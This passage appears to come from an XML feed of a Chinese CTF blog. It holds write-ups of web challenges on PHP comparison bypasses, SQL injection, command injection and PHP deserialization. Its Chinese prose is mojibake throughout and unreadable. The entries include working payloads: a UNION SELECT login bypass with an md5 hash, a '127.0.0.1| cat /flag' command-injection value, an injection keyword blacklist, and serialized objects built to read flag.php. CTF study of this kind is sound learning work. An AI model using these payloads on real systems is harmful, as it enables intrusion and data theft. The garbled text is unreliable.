ä¸ºå‡½æ•°æ¥å—ä¸äº†ä¸ç¬¦åˆçš„å­—ç¬¦ä¸²ç±»å‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯åˆ¤å®šä¸ºç›¸ç­‰ã€‚</p><h1>switchç»•è¿‡</h1><pre><code>     &lt;?php   $a=&quot;4admin&quot;;    switch ($a) &#123;case 1:    echo &quot;fail1&quot;;    break;case 2:    echo &quot;fail2&quot;;    break;case 3:    echo &quot;fail3&quot;;    break;case 4:    echo &quot;sucess&quot;;  //ç»“æœè¾“å‡ºsuccess;    break;default:    echo &quot;failall&quot;;    break;      &#125;    ?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu havefun</title>
      <link href="/2021/01/31/buu/"/>
      <url>/2021/01/31/buu/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>have fun</p><span id="more"></span><p>ç­¾åˆ°çº§åˆ«çš„å§ï¼Œshift+f12å°±å¯ä»¥äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>badysqli</title>
      <link href="/2021/01/30/bodysqli/"/>
      <url>/2021/01/30/bodysqli/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.png"></p><p>ä½“éªŒäº†sqlmapä¸€æŠŠæ¢­çš„ä¹è¶£ï¼Œä½†æ˜¯æ²¡ç”¨ï¼Œè¿™ä¸ªé¢˜ç›®ä¸Šæ²¡æœ‰æç¤ºmd5åŠ å¯†ï¼Œæˆ‘æ˜¯çœ‹wpæ‰çŸ¥é“<br><br>åç«¯è¯­å¥</p><pre><code>   &lt;?$name = $_POST[&#39;name&#39;];$passwd = md5($_POST[&#39;pw&#39;]);$sql = &quot;select * from user where username = &#39;$name&#39;&quot;;$query = mysql_query($sql);//mysql_query() å‡½æ•°æ‰§è¡Œä¸€æ¡ MySQL æŸ¥è¯¢if (!strcasecmp($passwd, $query[passwd])) &#123;//strcasecmpæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆä¸åŒºåˆ†å¤§å°å†™)echo $flag;&#125; else &#123;  echo(&quot;Wrong Pass&quot;);&#125;</code></pre><p>çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯å¦‚æœåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®ï¼Œæ•°æ®åº“å¯ä»¥è‡ªåŠ¨å¸®æˆ‘ä»¬ç”Ÿæˆã€‚</p><p><img src="2.png"></p><p>ç°åœ¨å¼€å§‹è§£é¢˜ï¼Œ<br>fuzzæµ‹è¯•çŸ¥é“orï¼Œï¼‰è¢«è¿‡æ»¤ï¼Œå¼€å§‹æŸ¥å‡ºå­—æ®µæ˜¯3.<br><br>ç„¶åï¼Œåœ¨è¿™ä¸ªç”¨æˆ·åè¾“å…¥adminè¿”å›æ—¶wrong pass ,å…¶ä»–éƒ½æ˜¯nouser,æ‰€ä»¥çŒœæµ‹ä¸€å®šå­˜åœ¨adminçš„ç”¨æˆ·åï¼Œç°åœ¨ä¸»è¦åšçš„å°±æ˜¯åˆ¤æ–­nameè¿™ä¸ªå­—æ®µçš„ä½ç½®ã€‚è¾“å…¥1â€™ union select 1,â€™adminâ€™,2 #æ˜¯wrong passï¼Œ1â€™ union select 1,2ï¼Œâ€™adminâ€™#æ˜¯wrong userï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ 1â€™ union select 1,â€™adminâ€™,â€™202cb962ac59075b964b07152d234b70â€™ #å¯†ç è¾“å…¥123ï¼Œå¯ä»¥å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>suctf sql</title>
      <link href="/2021/01/30/suctf/"/>
      <url>/2021/01/30/suctf/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.png"></p><pre><code>&lt;?phpsession_start();include_once &quot;config.php&quot;;$post = array();$get = array();global $MysqlLink;//GetPara();$MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);if(!$MysqlLink)&#123;    die(&quot;Mysql Connect Error!&quot;);&#125;$selectDB = mysqli_select_db($MysqlLink,$dataName);if(!$selectDB)&#123;    die(&quot;Choose Database Error!&quot;);&#125;foreach ($_POST as $k=&gt;$v)&#123;    if(!empty($v)&amp;&amp;is_string($v))&#123;        $post[$k] = trim(addslashes($v));    &#125;&#125;foreach ($_GET as $k=&gt;$v)&#123;    &#125;&#125;//die();?&gt;</code></pre><p>é“¾æ¥æ•°æ®åº“å¹¶å¯¹åº”é”®å€¼</p><pre><code>&lt;?phpif(isset($post[&#39;query&#39;]))&#123;    $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;    //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]));    if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]))&#123;        //echo $post[&#39;query&#39;];        die(&quot;Nonono.&quot;);    &#125;    if(strlen($post[&#39;query&#39;])&gt;40)&#123;        die(&quot;Too long.&quot;);    &#125;    $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;    mysqli_multi_query($MysqlLink,$sql);    do&#123;        if($res = mysqli_store_result($MysqlLink))&#123;            while($row = mysqli_fetch_row($res))&#123;                print_r($row);            &#125;        &#125;    &#125;while(@mysqli_next_result($MysqlLink));&#125;?&gt;</code></pre><p><mark>$sql = â€œselect â€œ.$post[â€˜queryâ€™].â€||flag from Flagâ€;<mark><br><br>è¿™ä¸ªåº”è¯¥æ˜¯å¾ˆé‡è¦çš„ï¼Œæˆ‘ä»¬çŸ¥é“äº†åç«¯è¯­å¥ï¼Œæ„é€ *ï¼Œ1<br><br>$sql = select *,1||flag from Flag.<br>1å’Œflagåšé€»è¾‘æˆ–è¿ç®—ï¼Œç›¸å½“äº</p><p><img src="2.png"></p><p>å¯ä»¥æŸ¥å‡ºæ‰€æœ‰çš„æ•°æ®</p><p>ä½†è¿™å¥½åƒä¸æ˜¯é¢„æœŸè§£é‡Š</p><p>é¢„æœŸè§£é‡Šæ˜¯è¿ç”¨ set sql_mode=PIPES_AS_CONCAT</p><p><img src="3.png"></p><p>è¿™æ ·å¯ä»¥æŠŠ||è½¬æ¢ä¸ºè¿æ¥ç¬¦</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hardsql</title>
      <link href="/2021/01/27/hardsql/"/>
      <url>/2021/01/27/hardsql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babysql</title>
      <link href="/2021/01/27/babysql/"/>
      <url>/2021/01/27/babysql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>å­¦åˆ°äº†ç»•è¿‡æ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯æç¤ºä¸ºinput your name passwordï¼Œè¯´æ˜å…³é”®å­—è¢«æ›¿æ¢ä¸ºç©ºæ ¼ï¼Œæ˜¾ç¤ºä¸ºç©ºï¼Œä½¿ç”¨åŒå†™ç»•è¿‡</p><p><img src="1.png"></p><p>å¦‚æœ=è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨likeæ›¿ä»£ï¼ˆæ¨¡ç³ŠæŸ¥æ‰¾è¿ç®—ç¬¦ï¼‰ï¼Œâ€˜%â€™ä»£è¡¨0æ¬¡æˆ–næ¬¡ä»»æ„å­—ç¬¦ï¼Œâ€˜_â€™ä»£è¡¨åªåŒ¹é…ä¸€æ¬¡ä»»æ„å­—ç¬¦ï¼Œ<br><br>å¦‚æœsubstrè¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨leftï¼ˆï¼‰ï¼Œrightï¼ˆï¼‰è¿™ä¸¤ä¸ªå‡½æ•°æ¥æ›¿ä»£<br><br>left(å­—ç¬¦ä¸²,ä»å·¦å¼€å§‹æ•°å‡ ä½)<br>rightï¼ˆå­—ç¬¦ä¸²ï¼Œä»å³å¼€å§‹æ•°å‡ ä½ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lovesql</title>
      <link href="/2021/01/26/postlovesql/"/>
      <url>/2021/01/26/postlovesql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>è®¤è¯†ä¸€ä¸ªæ–°çš„å‡½æ•°<br><br>concat_ws<br><br>ä¸€èˆ¬å†™çš„æ˜¯(â€˜<code>&#39;,password,&#39;</code>â€˜,name)<br><br>è¿™ä¸ªå¯ä»¥å¸®å¿™<br><br>concat_ws(â€˜`â€™,password,name)<br></p><p>å›å½’æ­£é¢˜</p><p><img src="1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜easysql</title>
      <link href="/2021/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98easysql/"/>
      <url>/2021/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98easysql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>è¿™ä¸ªä¸»è¦æ˜¯å­¦ä¹ åˆ°äº†æŠ¥é”™æ³¨å…¥</p><p><img src="1.png"></p><p>ä¸€èˆ¬ç™»å½•ç•Œé¢ç”¨ä¸åˆ°è”åˆæ³¨å…¥ï¼Œè”åˆæ³¨å…¥æ˜¯ä¸ºäº†æŸ¥è¯¢ä»€ä¹ˆä¸œè¥¿ï¼Œæ¯”å¦‚idã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>postbuuåˆ·é¢˜ç¬¬å››å¤© exec</title>
      <link href="/2021/01/19/postbuu%E5%88%B7%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
      <url>/2021/01/19/postbuu%E5%88%B7%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>æ¯”è¾ƒç®€å•çš„ä¸€é“exec</h1><p>pingäº†ä¸€ä¸ª127.0.0.1ç”¨ | æ‹¼æ¥äº†lsï¼Œ/æŸ¥çœ‹äº†æ ¹ç›®å½•ï¼Œç„¶åcatï¼Œå…¨ç¨‹æ— è¿‡æ»¤ã€‚127.0.0.1| cat /flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤ä¹ ä¸€æ³¢</title>
      <link href="/2021/01/19/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2/"/>
      <url>/2021/01/19/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2/</url>
      
        <content type="html"><![CDATA[<p>#åšäº†è¿™ä¹ˆå¤šé“é¢˜ï¼Œä¹Ÿæ¥å¤ä¹ ä¸€ä¸‹å§ã€‚</p><span id="more"></span><h1>ä¸¤æ•°ä¹‹å’Œ</h1><pre><code>   #include &lt;iostream&gt; using namespace std;int main()&#123;int a[10]; int i,j,n; int t; cout&lt;&lt;&quot;è¾“å…¥ä½ æƒ³è¦çš„ç›®æ ‡å€¼&quot;&lt;&lt;endl; cin&gt;&gt;t; cout&lt;&lt;&quot;è¾“å…¥åä¸ªæ•°&quot;; for(i=0;i&lt;10;i++)&#123; cin&gt;&gt;j; a[i]=j; &#125; for(i=0;i&lt;10;i++)&#123; for(n=i+1;n&lt;10;n++)&#123;    if(a[i]+a[n]==t)&#123;        cout&lt;&lt;i&lt;&lt;&quot;  &quot;&lt;&lt;n&lt;&lt;endl;    &#125;&#125;&#125;&#125;</code></pre><p>è¿™æ˜¯æˆ‘åˆšæ‰é‡åšäº†ä¸€éï¼Œå½“æ—¶åšçš„æ—¶å€™ï¼Œå¯¹cä»¥åŠc++äº†è§£ç”šå°‘ï¼Œè¿˜è§‰å¾—å¾ˆéš¾ï¼Œç°åœ¨å¥½å¤šäº†ï¼Œå¾ˆé¡ºåˆ©çš„å°±æŠŠä»£ç æ•²äº†å‡ºæ¥ã€‚</p><h1>exec</h1>æƒ³æ‰¾è¿™ä¸ªé¢˜ç›®åœ¨é‡åšä¸€éï¼Œä½†æ˜¯ï¼Œæ‰¾ä¸åˆ°äº†ã€‚ã€‚ã€‚æˆ‘åšè¿™é“é¢˜ä¸ä¼šçš„ç‚¹æ˜¯ï¼Œæœ‰ä¸€ä¸ªç•Œé¢æ˜¯<mark>notice:undefined index:ip in /var/www/html/exec1.php on lin5</mark><br>æ³¨æ„è¿™é‡Œçš„undefined indexæ˜¯æŒ‡æœªå®šä¹‰ç´¢å¼•ï¼Œæ˜¯æŒ‡ä½ çš„å‚æ•°æ²¡æœ‰ä¼ è¿‡æ¥ï¼Œæ‰€ä»¥åº”è¯¥åœ¨ç©¿ä¸€ä¸ªipçš„å‚æ•°ã€‚å› ä¸ºè¯¥ç•Œé¢ä¸‹æœ‰æç¤º<pre><code> ç”¨æ³•: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]        [-r count] [-s count] [[-j host-list] | [-k host-list]]        [-w timeout] [-R] [-S srcaddr] [-c compartment] [-p]        [-4] [-6] target_nameé€‰é¡¹: -t             Ping æŒ‡å®šçš„ä¸»æœºï¼Œç›´åˆ°åœæ­¢ã€‚               è‹¥è¦æŸ¥çœ‹ç»Ÿè®¡ä¿¡æ¯å¹¶ç»§ç»­æ“ä½œï¼Œè¯·é”®å…¥ Ctrl+Breakï¼›               è‹¥è¦åœæ­¢ï¼Œè¯·é”®å…¥ Ctrl+Cã€‚ -a             å°†åœ°å€è§£æä¸ºä¸»æœºåã€‚ -n count       è¦å‘é€çš„å›æ˜¾è¯·æ±‚æ•°ã€‚ -l size        å‘é€ç¼“å†²åŒºå¤§å°ã€‚ -f             åœ¨æ•°æ®åŒ…ä¸­è®¾ç½®â€œä¸åˆ†æ®µâ€æ ‡è®°(ä»…é€‚ç”¨äº IPv4)ã€‚ -i TTL         ç”Ÿå­˜æ—¶é—´ã€‚ -v TOS         æœåŠ¡ç±»å‹(ä»…é€‚ç”¨äº IPv4ã€‚è¯¥è®¾ç½®å·²è¢«å¼ƒç”¨ï¼Œ               å¯¹ IP æ ‡å¤´ä¸­çš„æœåŠ¡ç±»å‹å­—æ®µæ²¡æœ‰ä»»ä½•               å½±å“)ã€‚ -r count       è®°å½•è®¡æ•°è·ƒç‚¹çš„è·¯ç”±(ä»…é€‚ç”¨äº IPv4)ã€‚ -s count       è®¡æ•°è·ƒç‚¹çš„æ—¶é—´æˆ³(ä»…é€‚ç”¨äº IPv4)ã€‚ -j host-list   ä¸ä¸»æœºåˆ—è¡¨ä¸€èµ·ä½¿ç”¨çš„æ¾æ•£æºè·¯ç”±(ä»…é€‚ç”¨äº   IPv4)ã€‚ -k host-list    ä¸ä¸»æœºåˆ—è¡¨ä¸€èµ·ä½¿ç”¨çš„ä¸¥æ ¼æºè·¯ç”±(ä»…é€‚ç”¨äº  IPv4)ã€‚ -w timeout     ç­‰å¾…æ¯æ¬¡å›å¤çš„è¶…æ—¶æ—¶é—´(æ¯«ç§’)ã€‚ -R             åŒæ ·ä½¿ç”¨è·¯ç”±æ ‡å¤´æµ‹è¯•åå‘è·¯ç”±(ä»…é€‚ç”¨äº IPv6)ã€‚               æ ¹æ® RFC 5095ï¼Œå·²å¼ƒç”¨æ­¤è·¯ç”±æ ‡å¤´ã€‚               å¦‚æœä½¿ç”¨æ­¤æ ‡å¤´ï¼ŒæŸäº›ç³»ç»Ÿå¯èƒ½ä¸¢å¼ƒ               å›æ˜¾è¯·æ±‚ã€‚ -S srcaddr     è¦ä½¿ç”¨çš„æºåœ°å€ã€‚ -c compartment è·¯ç”±éš”ç¦»èˆ±æ ‡è¯†ç¬¦ã€‚ -p             Ping Hyper-V ç½‘ç»œè™šæ‹ŸåŒ–æä¾›ç¨‹åºåœ°å€ã€‚ -4             å¼ºåˆ¶ä½¿ç”¨ IPv4ã€‚ -6             å¼ºåˆ¶ä½¿ç”¨ IPv6ã€‚</code></pre><p>pingçš„ç”¨æ³•ï¼Œæ‰€ä»¥æƒ³åˆ°æ„é€ ip=127.0.0.1ï¼Œç„¶åæˆåŠŸæœ‰æ¥æ”¶åˆ°æ–‡ä»¶ï¼Œç„¶åå°±Â·å‘½ä»¤æ‰§è¡Œç»•è¿‡å¾—åˆ°flagã€‚</p><h1>ä¸¤é“rce</h1>è¯´å®åœ¨è¿™ä¸¤é“é¢˜éƒ½å¾ˆç®€å•ï¼Œç„¶è€Œé‚£æ—¶å€™çœŸçš„æ˜¯å¤ªèœäº†ï¼Œæ„£æ˜¯æ‰¾å‡ºäº†ä¸¤ä¸ªå¾ˆéš¾å¾—åšæ³•ã€‚ã€‚ã€‚ã€‚çœŸæ˜¯æ— è¯­äº†ã€‚                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>postbuuç½‘é¼æ¯areunserialize</title>
      <link href="/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/"/>
      <url>/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code>    &lt;?phpinclude(&quot;flag.php&quot;); highlight_file(__FILE__);class FileHandler &#123;protected $op;protected $filename;protected $content;//ç±»å‹ä¸ºprotectedfunction __construct() &#123;    $op = &quot;1&quot;;    $filename = &quot;/tmp/tmpfile&quot;;//è¿™ä¸ªtmpæ˜¯ä¸´æ—¶æ‰§è¡Œæ–‡ä»¶    $content = &quot;Hello World!&quot;;    $this-&gt;process();&#125;public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;private function write() &#123;    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;        if(strlen((string)$this-&gt;content) &gt; 100) &#123;            $this-&gt;output(&quot;Too long!&quot;);            die();//é€€å‡ºè„šæœ¬ï¼Œæ‰€ä»¥è¦ä½¿ç”¨çš„è¯è¦è®©contentçš„é•¿åº¦å°äº100        &#125;        $res = file_put_contents($this-&gt;filename, $this-&gt;content);//resä¸ºè¦è®©contentçš„ä¸œè¥¿å†™å…¥fileçš„æ–‡ä»¶ä¸­å»        if($res) $this-&gt;output(&quot;Successful!&quot;);        else $this-&gt;output(&quot;Failed!&quot;);    &#125; else &#123;        $this-&gt;output(&quot;Failed!&quot;);    &#125;&#125;private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);//æŠŠæ•´ä¸ªæ–‡ä»¶å†™å…¥å­—ç¬¦ä¸²ä¸­    &#125;    return $res;&#125;private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;&#125;function is_valid($s) &#123;for($i = 0; $i &lt; strlen($s); $i++)    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))//å¦‚æœè¿™ä¸ªå­—ç¬¦ä¸²çš„é¦–ä½çš„asciiçš„å€¼åœ¨32ä¸125çš„åŒºé—´é‡Œè¿”å›true        return false;return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;$str = (string)$_GET[&#39;str&#39;];//ç”¨getçš„æ–¹æ³•ä¼ å…¥ä¸€ä¸ªå‚æ•°if(is_valid($str)) &#123;//å¦‚æœå®ƒæ˜¯çœŸçš„ååºåˆ—åŒ–str    $obj = unserialize($str);&#125;&#125;</code></pre><p>å…ˆçœ‹è¿™é‡Œ<br></p><pre><code> if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;$str = (string)$_GET[&#39;str&#39;];if(is_valid($str)) &#123;    $obj = unserialize($str);&#125;</code></pre><p>ç”¨getçš„æ–¹æ³•ä¼ å…¥ä¸€ä¸ªå‚æ•°å¦‚æœå®ƒé€šè¿‡äº†is_validçš„æ£€éªŒï¼Œé‚£ä¹ˆè¿›è¡Œååºåˆ—åŒ–ï¼Œé€šè¿‡æ£€éªŒçš„æ–¹æ³•æ˜¯å­—ç¬¦ä¸²çš„asciiçš„å€¼è¦åœ¨32~125ä¹‹é—´ã€‚<br><br>å› ä¸ºè¿™ä¸ªç±»æ²¡æœ‰å®ä¾‹åŒ–å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ¥åˆ°ææ„å‡½æ•°ã€‚<br></p><pre><code>function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;</code></pre><p>å¦‚æœopçš„å€¼ä¸ºâ€œ2â€ï¼Œæ³¨æ„è¿™é‡Œçš„2æ˜¯å­—ç¬¦ä¸²å‹ï¼Œé‚£ä¹ˆè®²opçš„å€¼èµ‹ä¸ºâ€œ1â€ï¼Œifä¹‹åæ˜¯contentçš„å€¼ä¸ºâ€œâ€ï¼Œæ‰§è¡Œprocessã€‚<br></p><pre><code>        public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;</code></pre><p>å¦‚æœopä¸º1ï¼Œé‚£ä¹ˆæ‰§è¡Œwriteï¼Œä½†æ˜¯emmï¼Œwriteå¯¹è§£é¢˜æ²¡æœ‰å¸®åŠ©ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®©opçš„å€¼ä¸º2ï¼Œè¿›è¡Œread,ç„¶åè®²readçš„å€¼ç»™resï¼Œç„¶åæ¥åˆ°outputã€‚<br></p><pre><code>   private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);//æŠŠæ•´ä¸ªæ–‡ä»¶å†™å…¥å­—ç¬¦ä¸²ä¸­    &#125;    return $res;&#125;</code></pre><p>readè¿™é‡Œæ˜¯è¯´è®©resçš„å€¼ä¸ºç©ºï¼Œæ£€éªŒæ˜¯å¦è®¾å®šfilenameè¿™ä¸ªå˜é‡ï¼Œç„¶åè¯»å–filenameçš„å†…å®¹ï¼Œè¿”å›resã€‚<br></p><pre><code>     private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;</code></pre><p> å¾—åˆ°flagã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ ã€‚</p><pre><code> &lt;?php     class FileHandler&#123;protected op=2;protected filename=&#39;flag.php&#39;;protected contentp;      &#125;   $obj=new FileHandler();  echo serialize($obj); ?&gt;   </code></pre><p>å¾—åˆ°<mark>O:11:â€FileHandlerâ€:3:{s:5:â€%00*%00opâ€;i:2;s:11:â€%00*%00filenameâ€;s:8:â€flag.phpâ€;s:10:â€%00*%00contentâ€;N;}</mark>ä½†æ˜¯è¿™æ²¡æœ‰æˆåŠŸï¼Œå› ä¸ºis_vaileéƒ½æ²¡æœ‰è¿‡å»ï¼Œ%00çš„asciiå€¼å¥½åƒæ˜¯0.ç°åœ¨è¦ç»•è¿‡è¿™ä¸ªï¼Œæœ‰ä¸¤ç§æ–¹æ³•ã€‚<br></p><li>  <pre><code>    &lt;?php     class FileHandler&#123;public op=2;public filename=&#39;flag.php&#39;;public contentp;      &#125;   $obj=new FileHandler();  echo serialize($obj); ?&gt;     å¥½åƒæ˜¯phpç‰ˆæœ¬7.1ä»¥ä¸Šï¼Œå¯¹å˜é‡çš„å±æ€§çš„è¦æ±‚ä¸ä¸¥æ ¼</code></pre><li><pre><code>  O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;/00*/00op&quot;;i:2;S:11:&quot;/00*/00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;/00*/00content&quot;;N;&#125;  è®²sæ”¹ä¸ºå¤§å†™ï¼Œ%00å¯å†™ä¸º/00ç”¨16è¿›åˆ¶ç»•è¿‡</code></pre><p>ç„¶åÂ·ctrl uæŸ¥çœ‹é¡µé¢æºä»£ç </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—å­¦ä¹ &amp;buuåˆ·é¢˜çš„ç¬¬äºŒå¤©,CTFshowéƒ¨åˆ†é¢˜ç›®</title>
      <link href="/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>ä»¥æ­¤ç”¨æ¥è®°å½•å­¦ä¹ ååºåˆ—åŒ–çš„æ—¶å€™é‡è§çš„é¢˜ç›®</p><span id="more"></span><h1>é¢˜ç›®ä¸€</h1><p><img src="1.png"></p><h1>é¢˜ç›®äºŒ(buuæå®¢å¤§æŒ‘æˆ˜php)</h1>æ‰“å¼€é¢˜ç›®ï¼Œä¸Šé¢æç¤ºè¯´å¤‡ä»½ç½‘ç«™ï¼ŒæŒ‰ç…§å¸¸è§„æ€è·¯ï¼Œå¤‡ä»½ç½‘ç«™åº”è¯¥æ˜¯index.php.bakï¼Œä½†æ˜¯å‡ºç°äº†404ï¼Œç„¶åå°±æƒ³ç€æ‰«ä¸€ä¸‹ç›®å½•ã€‚å¼€å§‹æˆ‘ç”¨å¾¡å‰‘æ²¡æ‰«å‡ºæ¥ï¼Œå°±æ€€ç€ä¾¥å¹¸çš„å¿ƒç†ï¼Œæˆ‘è®°å¾—æˆ‘ä»¥å‰åšé¢˜çš„æ—¶å€™é‡è§è¿‡www.zipç„¶åå°±çœŸçš„æˆåŠŸäº†ï¼Œåæ¥çœ‹åˆ«äººè®²è¿™é“é¢˜çš„è§†é¢‘çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªctf-wcanè¿™ä¸ªå·¥å…·ï¼Œäºæ˜¯å†æ‰«ä¸€ä¸‹å°±çœŸçš„æˆåŠŸäº†ã€‚æ ¼å¼ä¸º python ctf-wcan.py url | gref 200(200æ˜¯æœ‰æˆåŠŸå›å“çš„)ã€‚ä¸‹è½½å¼¹å‡ºæ¥çš„å‹ç¼©åŒ…ï¼Œè§£å‹åæœ‰5ä¸ªphpæ–‡ä»¶ã€‚ï¼ˆæœ‰ä¸€ä¸ªæ–‡ä»¶æ˜¯flag.phpï¼Œé‡Œé¢æœ‰ä¸€ä¸ªflagï¼Œæ„Ÿè§‰è¿™é“é¢˜ä¸ä¼šå°±è¿™ä¹ˆç®€å•ï¼Œæ‹¿flagå»éªŒè¯ä¸€ä¸‹ï¼Œæœç„¶æ˜¯é”™çš„ã€‚ï¼‰<br>å…ˆåˆ†ææ˜¯æ‹¿åˆ°index.php<p><img src="2.png"></p><p>çœŸä¸ªindex.phpä¹Ÿå°±è¿™é‡Œå¯¹æˆ‘ä»¬è§£é¢˜æœ‰å¸®åŠ©ã€‚è¿™ä¹Ÿå°±æç¤ºäº†å­˜åœ¨ååºåˆ—åŒ–æ¼æ–—ã€‚å› ä¸ºæˆ‘ä»¬å¯¹ä¼ å…¥çš„å‚æ•°å¯æ§ã€‚<BR><br>æ‰“å¼€class.php</p><p><img src="3.png"></p><p>å› ä¸ºè¦è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå†…å®¹åŒ…æ‹¬password=100,username=admin<br><br>äºæ˜¯å¾—åˆ°<mark>O:4:â€Nameâ€:2:{s:14:â€Nameusernameâ€;s:5:â€adminâ€;s:14:â€Namepasswordâ€;i:100;}</mark><br>ç”±äºæˆ‘ä»¬ç”¨çš„æ˜¯privateå®šäºçš„å˜é‡ï¼Œæ‰€ä»¥è¦æ”¹ä¸º<mark>O:4:â€Nameâ€:2:{s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;i:100;}</mark><br>äºæ˜¯æ„é€ ï¼Ÿselect=O:4:â€Nameâ€:2:{s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;i:100;}ï¼Œå‘ç°è¿™ä¸ªæ˜¯æ²¡æœ‰å›å“çš„ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› 